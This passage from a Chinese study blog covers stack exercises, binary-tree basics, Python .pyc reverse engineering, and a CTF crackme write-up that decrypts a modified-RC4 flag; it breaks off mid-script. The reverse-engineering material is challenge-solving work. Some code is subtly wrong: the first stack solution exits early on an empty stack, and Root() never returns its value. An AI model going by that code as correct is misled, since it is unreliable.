<p>2 （输出： 234 ，操作后栈里面的元素为： 123 ）</p>
<p>2 （输出： 123 ，操作后栈里面的元素为：空）</p>
<p>2 （输出： empty ）</p>
<p>对应后面 3 个第 2 类操作，你的程序需要输出，</p>
<p>234</p>
<p>123</p>
<p>empty</p>
<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行： 1 个数 n(1≤n≤10000)<br>后面 n 行：每行 1 种操作， 1X 或者 2 （ 0≤x≤10000)</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>对应所有操作 2 ，输出被弹出的数或者” empty”</p>
<h4 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">1 123</span><br><span class="line">1 234</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<h4 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">234</span><br><span class="line">123</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxN = <span class="number">100000</span>;</span><br><span class="line"><span class="type">int</span> st[MaxN + <span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> total;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	stack &lt;<span class="type">int</span>&gt; st;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n ;</span><br><span class="line">	<span class="type">int</span> x, y;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cin &gt;&gt; x;</span><br><span class="line">		<span class="keyword">if</span> (x == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			cin &gt;&gt; y;</span><br><span class="line">			st.<span class="built_in">push</span>(y);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (x == <span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (st.<span class="built_in">empty</span>())</span><br><span class="line">			&#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;Empty&quot;</span> &lt;&lt; endl;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			cout &lt;&lt; st.<span class="built_in">top</span>() &lt;&lt; endl;</span><br><span class="line">			st.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="数字游戏"><a href="#数字游戏" class="headerlink" title="数字游戏"></a>数字游戏</h3><p>现在有 n 个数字依次进入一个栈，每个数字 a 进入栈的时候，如果栈顶元素小于 a ，则会将栈顶元素弹出，新的栈顶元素如果仍然小于 a ，则会将新的栈顶元素继续弹出，直到栈顶元素大于等于 a 为止， a 才会加入栈。问 n 个数字依次进入后，最后栈里的数字依次是？</p>
<h4 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式"></a>输入格式</h4><p>输入第一行一个整数 n （ n≤100000 ），表示有 n 个数字依次进入栈。<br>接下来 n 行，每行一个整数，表示第 i 个数字。</p>
<h4 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式"></a>输出格式</h4><p>若干行，表示最后栈中的数字。</p>
<h4 id="输入样例-1"><a href="#输入样例-1" class="headerlink" title="输入样例"></a>输入样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">5</span><br><span class="line">3</span><br><span class="line">2 </span><br><span class="line">4</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<h4 id="输出样例-1"><a href="#输出样例-1" class="headerlink" title="输出样例"></a>输出样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">4</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">10000</span>;</span><br><span class="line">stack&lt;<span class="type">int</span>&gt; s;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;<span class="comment">//有n个数字依次进入栈</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        cin &gt;&gt; a;</span><br><span class="line">        <span class="keyword">while</span> (!s.<span class="built_in">empty</span>() &amp;&amp; s.<span class="built_in">top</span>() &lt; a)</span><br><span class="line">        &#123;</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        s.<span class="built_in">push</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> arr[N];</span><br><span class="line">    <span class="keyword">while</span> (!s.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        arr[i++] = s.<span class="built_in">top</span>();</span><br><span class="line">        s.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = i - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, arr[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learn</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>树的基本概念</title>
    <url>/2023/01/07/%E6%A0%91/</url>
    <content><![CDATA[<p>树是一种非线性的数据结构，用它能很好地描述有分支和层次特性的数据结构</p>
<h1 id="树的概念"><a href="#树的概念" class="headerlink" title="树的概念"></a>树的概念</h1><h2 id="树的定义"><a href="#树的定义" class="headerlink" title="树的定义"></a>树的定义</h2><p>一棵树是由n(n&gt;0)个元素组成的有限集合</p>
<ul>
<li>每个元素称为结点(node)</li>
<li>有一个特定的结点，称为根结点或树根(root)</li>
<li>除根结点外，其余结点能分成m(m&gt;&#x3D;0)个互不相交的有限集合T0,T1,T2….其中的每个子集又都是一颗树，这些集合称为这颗树的子树。</li>
</ul>
<h2 id="树的基本术语"><a href="#树的基本术语" class="headerlink" title="树的基本术语"></a>树的基本术语</h2><ul>
<li>结点(node)：树中的元素</li>
<li>边：根结点与它的子树根之间形成边</li>
<li>路径(path)：从某个结点沿树中的边可到达另一个结点，则称这两个结点之间存在一条路径</li>
<li>双亲(parent)：若一个结点有子树，那么该结点称为子树根的双亲（父结点）</li>
<li>孩子(child)：某结点的子树的根称为该结点的孩子</li>
<li>兄弟(sibling)：有相同双亲的结点互为兄弟</li>
<li>后裔(descendant)：某结点的所有子树上任何结点都是该结点的后裔</li>
<li>祖先(ancester)：从根结点到某个结点的路径上的所有结点都是该结点的祖先</li>
<li>结点的度(degree)：结点拥有的子树数</li>
<li>叶子(leaf)：度为零的结点</li>
<li>分支结点(branch)：度不为零的结点</li>
<li>树的度：树中各结点度的最大值</li>
<li>结点的层次：根结点的层次为为1，其余结点的层次等于其双亲结点的层次加1</li>
<li>树的高度：树中结点的最大层次</li>
<li>森林：树的集合，0棵或多棵不相交的树组成森林</li>
</ul>
<h1 id="二叉树的定义及性质"><a href="#二叉树的定义及性质" class="headerlink" title="二叉树的定义及性质"></a>二叉树的定义及性质</h1><h2 id="二叉树的定义"><a href="#二叉树的定义" class="headerlink" title="二叉树的定义"></a>二叉树的定义</h2><p>二叉树(binary tree)是结点的有限集合，该集合或者为空集，或者由一个根和两个互不相交的、称为该根的左子树和右子树的二叉树组成</p>
<h3 id="树与二叉树的区别"><a href="#树与二叉树的区别" class="headerlink" title="树与二叉树的区别"></a>树与二叉树的区别</h3><ul>
<li>树中结点的子树之间可以是无序的，而二叉树中结点的子树要区分左右子树</li>
<li>树中每个结点可以有0棵或若干子树，而二叉树的每个结点最多只能有2棵子树</li>
</ul>
<h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><ul>
<li>二叉树的第i(i&gt;&#x3D;1)层上至多有2的(i-1)次方个结点</li>
<li>高度为h的二叉树上至多有2的h次方减一个结点（等比数列证明）</li>
<li>包含n个结点的二叉树的高度最矮为log2(n+1)，最高为n（当每层只有一个结点的时候最高）</li>
<li>任意一棵二叉树中，若叶节点数量为n0，度为2的结点数量为n2，则有：n0&#x3D;n2+1</li>
</ul>
<h2 id="特殊二叉树"><a href="#特殊二叉树" class="headerlink" title="特殊二叉树"></a>特殊二叉树</h2><h4 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h4><p>每一层的结点数量都达到饱和状态</p>
<h4 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h4><ul>
<li><p>只有最下面两层结点的度可以小于2，其它层中结点的度均等于2</p>
</li>
<li><p>最下一层的叶结点均依次集中在靠左的若干位置上</p>
<h5 id="性质-1"><a href="#性质-1" class="headerlink" title="性质"></a>性质</h5></li>
</ul>
<p>具有n个结点的完全二叉树的高度为log2(n+1) </p>
<img src="/2023/01/07/%E6%A0%91/20230107213257.jpg" class title="This is an image">

<h4 id="扩充二叉树"><a href="#扩充二叉树" class="headerlink" title="扩充二叉树"></a>扩充二叉树</h4><p>除叶子结点外，其余结点都必须有两个孩子，也称为2-树（仅存在度有2和0的结点）</p>
<h4 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h4><img src="/2023/01/07/%E6%A0%91/20230107212356.jpg" class title="This is an image">

<p> 满二叉树一定是完全二叉树，也是扩充二叉树</p>
<h2 id="二叉树ADT（抽象数据类型）"><a href="#二叉树ADT（抽象数据类型）" class="headerlink" title="二叉树ADT（抽象数据类型）"></a>二叉树ADT（抽象数据类型）</h2><p>运算：</p>
<p>Create(bt)：构造一棵空二叉树bt</p>
<p>NewNode(x,ln,rn)：创建一个新结点，该结点的值为x，ln和rn为该结点的左右孩子结点</p>
<p>IsEmpty(bt)：若二叉树bt为空，则返回TRUE，否则返回FALSE</p>
<p>ClearTree(bt)：清除二叉树bt中所有结点，使之成为空二叉树</p>
<p>Root(bt,x)：若二叉树bt非空，则获取根结点中的数据，并返回TRUE，否则返回FALSE</p>
<p>MakeTree(bt,x,left,right)：构造一棵树bt,根结点的值为x，left和right为该根结点的左右子树</p>
<p>ProOrderTree(bt)：先序遍历二叉树bt</p>
<p>InOrderTree(bt)：中序遍历二叉树bt</p>
<p>PostOrderTree(bt)：后序遍历二叉树bt</p>
<p>LevelOrderTree(bt)：宽度优先(层次)遍历二叉树bt</p>
<h2 id="完全二叉树是如何存储的？"><a href="#完全二叉树是如何存储的？" class="headerlink" title="完全二叉树是如何存储的？"></a>完全二叉树是如何存储的？</h2><h3 id="顺序存储表示"><a href="#顺序存储表示" class="headerlink" title="顺序存储表示"></a>顺序存储表示</h3><ul>
<li>结点按从上到下、从左到右，逐层顺序存储于一块连续的存储单元(即数组)</li>
<li>根结点存储在下标为0的位置，其他结点按上述性质中的编号规则依次顺序存储</li>
</ul>
<h3 id="一般二叉树的顺序存储表示"><a href="#一般二叉树的顺序存储表示" class="headerlink" title="一般二叉树的顺序存储表示"></a>一般二叉树的顺序存储表示</h3><p>通过在一般二叉树中增加”空结点“，将二叉树改造成完全二叉树（理论上可行，但可能存在较大的空间浪费）</p>
<h3 id="二叉树的链接表示"><a href="#二叉树的链接表示" class="headerlink" title="二叉树的链接表示"></a>二叉树的链接表示</h3><img src="/2023/01/07/%E6%A0%91/20230108105128.jpg" class title="This is an image">

<h2 id="二叉树的基本运算"><a href="#二叉树的基本运算" class="headerlink" title="二叉树的基本运算"></a>二叉树的基本运算</h2><p><strong>Create(bt)：构造一棵空二叉树bt</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void Create(BinaryTree *bt)</span><br><span class="line">&#123;</span><br><span class="line">    bt-&gt;root=NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>NewNode(x,ln,rn)：创建一个新结点，该结点的值为x，ln和rn为该结点的左右孩子结点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BTNode* NewNode(ElemType x,BTNode *ln,BTNode *rn)</span><br><span class="line">&#123;</span><br><span class="line">    BTNode *p=(BTNode*)malloc(sizeof(BTNode));//用malloc函数申请一个BTNode类型的结点空间</span><br><span class="line">    p-&gt;element=x;</span><br><span class="line">    p-&gt;lChild=ln;</span><br><span class="line">    p-&gt;rChild=rn;</span><br><span class="line">    return p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Root(bt,x)：若二叉树bt非空，则获取根结点中的数据，并返回TRUE，否则返回FALSE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BOOL Root(BinaryTree *bt,ElemType *x)</span><br><span class="line">&#123;</span><br><span class="line">    if(bt-&gt;root)</span><br><span class="line">    &#123;</span><br><span class="line">        x=&amp;bt-&gt;root-&gt;element;</span><br><span class="line">        return TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    return FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>MakeTree(bt,x,left,right)：构造一棵树bt,根结点的值为e，left和right为该根结点的左右子树</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void MakeTree(BinaryTree *bt,ElemType e,BinaryTree *left,BinaryTree *right)</span><br><span class="line">&#123;</span><br><span class="line">    if(bt-&gt;root||left==right)</span><br><span class="line">    return;</span><br><span class="line">    bt-&gt;root=NewNode(e,left-&gt;root,right-&gt;root);</span><br><span class="line">    left-&gt;root=right-&gt;root=NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learn</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈python逆向</title>
    <url>/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="pyc文件结构解析"><a href="#pyc文件结构解析" class="headerlink" title="pyc文件结构解析"></a>pyc文件结构解析</h2><p>pyc文件是python在编译过程中出现的主要中间过程文件，pyc文件是二进制的，可以由python虚拟机直接执行的程序，要注意的是pyc的内容和python版本是密切相关的</p>
<p>Python代码的编译结果就是PyCodeObject对象。PyCodeObject对象可以由虚拟机加载后直接运行，而pyc文件就是PyCodeObject对象在硬盘上的保存形式</p>
<p>pyc文件结构主要包括两部分：pyc文件头部表示和PyCodeObject对象部分</p>
<p>完整的pyc文件结构：</p>
<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221015182903419.png" class title="This is an image">

<p>我们可以通过运行实例，来理解pyc文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#源码：</span></span><br><span class="line">s=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    a=<span class="number">3</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">func()</span><br></pre></td></tr></table></figure>

<p>执行一下指令生成pyc文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -m py_compile test.py</span><br></pre></td></tr></table></figure>

<p>用二进制打开生成的test.pyc文件</p>
<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221015212226821.png" class title="This is an image">

<p>前4个字节：03f3 0d0a  表示python版本</p>
<p>第5-8个字节：9eb2 4a63  表示pyc文件修改时间</p>
<h2 id="pyc字节码是什么"><a href="#pyc字节码是什么" class="headerlink" title="pyc字节码是什么"></a>pyc字节码是什么</h2><p>Python实际上将源代码编译为一组虚拟机指令，Python的解释器就是该虚拟机的一个具体实现。这种跑在虚拟机内部的中间格式被称为“字节码”。</p>
<p><strong>补</strong>：因为python很吃环境，所以我们可以使用anaconda进行环境的切换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda create --name my_test python=3.7 #创建环境</span><br><span class="line">conda activate 环境名  #切换环境</span><br><span class="line">conda info --env #查看所创建的环境列表</span><br></pre></td></tr></table></figure>

<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221014203637627.png" class title="This is an image">

<h2 id="如何使用anaconda读取pyc文件的字节码？"><a href="#如何使用anaconda读取pyc文件的字节码？" class="headerlink" title="如何使用anaconda读取pyc文件的字节码？"></a>如何使用anaconda读取pyc文件的字节码？</h2><p>注意对应的环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import dis,marshal    #导入两个库</span><br><span class="line">f=open(&#x27;tmp.pyc&#x27;,&#x27;rb&#x27;).read()  #以二进制的形式读取</span><br><span class="line">code=marshal.loads(f[16:])  #装载，注意看py2还是py3</span><br><span class="line">code</span><br><span class="line">dis.dis(code)</span><br></pre></td></tr></table></figure>

<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221014204406181.png" class title="This is an image">

<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221014205000618.png" class title="This is an image">

<p><strong>补：</strong></p>
<ul>
<li>python2的magic number为前8个字节，python3的magic number为前16个字节</li>
<li>python2是三个字节为一个指令，python3是两个字节为一个指令</li>
</ul>
<p>所以一般来说我们会遇到几种类型题：</p>
<p>1.直接给出txt文件，让你翻译字节码</p>
<ul>
<li>读py字节码</li>
<li>根据opcode文件查询意思</li>
</ul>
<p>2.给出pyinstaller打包的exe文件</p>
<ul>
<li>pyinstxtractor工具解包</li>
<li>uncompyle6反编译</li>
</ul>
<p>3.给出pyc文件，加花或者没加花，后面会详细介绍加花的题目</p>
<h3 id="这里先给大家看一个最简单的例子："><a href="#这里先给大家看一个最简单的例子：" class="headerlink" title="这里先给大家看一个最简单的例子："></a>这里先给大家看一个最简单的例子：</h3><img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221227162243135.png" class title="This is an image">

<p>这里直接给了一个pyc文件，但无法进行反编译。我们仔细观察可以发现这个pyc文件缺少了时间戳，所以我们补上四字节就可以正常反编译了。</p>
<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221227163112058.png" class title="This is an image">

<p>无法反编译的情况，也有可能是因为加了花，我们后续再继续介绍。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>绿城杯2021-easy_re</title>
    <url>/2023/01/05/%E7%BB%BF%E5%9F%8E%E6%9D%AF2021-easy-re/</url>
    <content><![CDATA[<p>跟着PZ师傅复现一下绿城杯的easy_re</p>
<h2 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h2><img src="/2023/01/05/%E7%BB%BF%E5%9F%8E%E6%9D%AF2021-easy-re/image-20230105114113281.png" class title="This is an image">

<p>在这里把jz nop掉，后面可以按C将那些数据段都转为代码</p>
<p>去花后主逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  memset(S, 0, sizeof(S));</span><br><span class="line">  strcpy(key, &quot;tallmewhy&quot;);</span><br><span class="line">  memset(&amp;key[10], 0, 0xF6u);</span><br><span class="line">  v16[0] = xmmword_4021B0;</span><br><span class="line">  v16[1] = xmmword_4021C0;</span><br><span class="line">  v17 = 0x54E6D699;</span><br><span class="line">  v18 = 0x14504F7A;</span><br><span class="line">  v19 = 0xECE5;</span><br><span class="line">  puts(&quot;Hello, this is my world.If you want flag, give me something I like.&quot;);</span><br><span class="line">  sub_401010(&quot;\n&quot;, S[224]);</span><br><span class="line">  memset(v21, 0, sizeof(v21));</span><br><span class="line">  ((void (__cdecl *)(char *))gets)(v21);</span><br><span class="line">  v3 = strlen(v21);</span><br><span class="line">  key_len = strlen(key);</span><br><span class="line">  memset(T, 0, sizeof(T));</span><br><span class="line">  for ( i = 0; i &lt; 256; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    S[i] = i;</span><br><span class="line">    T[i] = key[i % key_len];</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = S[v6];</span><br><span class="line">    v7 = (v7 + T[v6] + v8) % 256;</span><br><span class="line">    S[v6++] = S[v7];</span><br><span class="line">    S[v7] = v8 ^ 0x37;  //这里作了一些变化</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v6 &lt; 256 );</span><br><span class="line">  sub_401010(&quot;\n\n&quot;, S[252]);</span><br><span class="line">  v9 = 0;</span><br><span class="line">  v20 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  if ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = (v9 + 1) % 256;</span><br><span class="line">      v11 = S[v9];</span><br><span class="line">      v10 = (v11 + v10) % 256;</span><br><span class="line">      S[v9] = S[v10];</span><br><span class="line">      S[v10] = v11;</span><br><span class="line">      v12 = v20;</span><br><span class="line">      v21[v20] ^= S[(unsigned __int8)(v11 + S[v9])];</span><br><span class="line">      v20 = v12 + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v12 + 1 &lt; v3 );</span><br><span class="line">    v10 = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( j = 0; j &lt; v3; ++j )</span><br><span class="line">    v10 = v21[j] == *((_BYTE *)v16 + j);</span><br><span class="line">  v14 = (char *)&amp;unk_402184;</span><br><span class="line">  if ( v10 == 1 )</span><br><span class="line">    v14 = aGood;</span><br><span class="line">  sub_401010(v14, S[252]);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显的一个RC4加密，key就是“tallmewhy”，有两种方法能拿到flag</p>
<img src="/2023/01/05/%E7%BB%BF%E5%9F%8E%E6%9D%AF2021-easy-re/image-20230105120203852.png" class title="This is an image">

<p>这里可以发现数据段是连续的，但要注意一下小端存储的问题</p>
<h2 id="直接写脚本"><a href="#直接写脚本" class="headerlink" title="直接写脚本"></a>直接写脚本</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> b[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> key[<span class="number">10</span>] = <span class="string">&quot;tallmewhy&quot;</span>;</span><br><span class="line">	<span class="type">char</span> flag[<span class="number">42</span>] = &#123; <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>, <span class="number">0xE4</span>, <span class="number">0x9F</span>, <span class="number">0xA5</span>, <span class="number">0x28</span>, <span class="number">0x65</span>, <span class="number">0x30</span>, <span class="number">0xF4</span>,</span><br><span class="line">		  <span class="number">0xEB</span>, <span class="number">0xD3</span>, <span class="number">0x24</span>, <span class="number">0xA9</span>, <span class="number">0x91</span>, <span class="number">0x1A</span>, <span class="number">0x6F</span>, <span class="number">0xD4</span>, <span class="number">0x6A</span>, <span class="number">0xD7</span>,</span><br><span class="line">		  <span class="number">0x0B</span>, <span class="number">0x8D</span>, <span class="number">0xE8</span>, <span class="number">0xB8</span>, <span class="number">0x83</span>, <span class="number">0x4A</span>, <span class="number">0x5A</span>, <span class="number">0x6E</span>, <span class="number">0xBE</span>, <span class="number">0xCB</span>,</span><br><span class="line">		  <span class="number">0xF4</span>, <span class="number">0x4B</span> ,<span class="number">0x99</span>,<span class="number">0xd6</span>,<span class="number">0xe6</span>,<span class="number">0x54</span>,<span class="number">0x7A</span>,<span class="number">0x4F</span>,<span class="number">0x50</span>,<span class="number">0x14</span>,<span class="number">0xE5</span>,<span class="number">0xEC</span> &#125;;</span><br><span class="line">	<span class="type">int</span> i, j, n, w, t;</span><br><span class="line">	<span class="type">int</span> v8 = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> v9 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i] = i;</span><br><span class="line">		b[i] = key[i % <span class="number">9</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">		v9 = s[i];</span><br><span class="line">		v8 = (v8 + b[i] + v9) % <span class="number">256</span>;</span><br><span class="line">		s[i] = s[v8];</span><br><span class="line">		s[v8] = v9 ^ <span class="number">0x37</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (w = <span class="number">0</span>, v8 = <span class="number">0</span>, i = <span class="number">0</span>; w &lt; <span class="number">42</span>; w++)</span><br><span class="line">	&#123;</span><br><span class="line">		i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">		v8 = (v8 + s[i]) % <span class="number">256</span>;</span><br><span class="line">		v9 = s[i];</span><br><span class="line">		s[i] = s[v8];</span><br><span class="line">		s[v8] = v9;</span><br><span class="line">		t = (s[i] + s[v8]) % <span class="number">256</span>;</span><br><span class="line">		flag[i - <span class="number">1</span>] ^= s[t];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">		<span class="built_in">putchar</span>(flag[i]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;c5e0f5f6-f79e-5b9b-988f-28f046117802&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="动调拿数据"><a href="#动调拿数据" class="headerlink" title="动调拿数据"></a>动调拿数据</h2><p>只要拿到密钥流和密文异或就能拿到flag</p>
<img src="/2023/01/05/%E7%BB%BF%E5%9F%8E%E6%9D%AF2021-easy-re/image-20230105120557272.png" class title="This is an image">

<p>找到最后异或加密的汇编代码，我们能发现数据在al寄存器中，地址是401252</p>
<img src="/2023/01/05/%E7%BB%BF%E5%9F%8E%E6%9D%AF2021-easy-re/image-20230105120905214.png" class title="This is an image">

<p>F9不断运行，可以拿到存储在寄存器中的数据</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span>=[<span class="number">0x93</span>,<span class="number">0xE0</span>,<span class="number">0xec</span>,<span class="number">0x83</span>,<span class="number">0xe4</span>,<span class="number">0xc6</span>,<span class="number">0x1d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x92</span>,<span class="number">0xde</span>,<span class="number">0xb5</span>,<span class="number">0x12</span>,<span class="number">0x84</span>,<span class="number">0xf7</span>,<span class="number">0x2d</span>,<span class="number">0x56</span>,<span class="number">0xb1</span>,<span class="number">0x47</span>,<span class="number">0xe2</span>,</span><br><span class="line">     <span class="number">0x69</span>,<span class="number">0xb4</span>,<span class="number">0x8a</span>,<span class="number">0x95</span>,<span class="number">0xba</span>,<span class="number">0x72</span>,<span class="number">0x62</span>,<span class="number">0x08</span>,<span class="number">0x93</span>,<span class="number">0xf9</span>,<span class="number">0xcc</span>,<span class="number">0x2d</span>,<span class="number">0xa9</span>,<span class="number">0xe2</span>,<span class="number">0xd0</span>,<span class="number">0x65</span>,<span class="number">0x4b</span>,</span><br><span class="line">     <span class="number">0x78</span>,<span class="number">0x68</span>,<span class="number">0x24</span>,<span class="number">0xd7</span>,<span class="number">0x91</span>]</span><br><span class="line">str2=[<span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>, <span class="number">0xE4</span>, <span class="number">0x9F</span>, <span class="number">0xA5</span>, <span class="number">0x28</span>, <span class="number">0x65</span>, <span class="number">0x30</span>, <span class="number">0xF4</span>,</span><br><span class="line">  <span 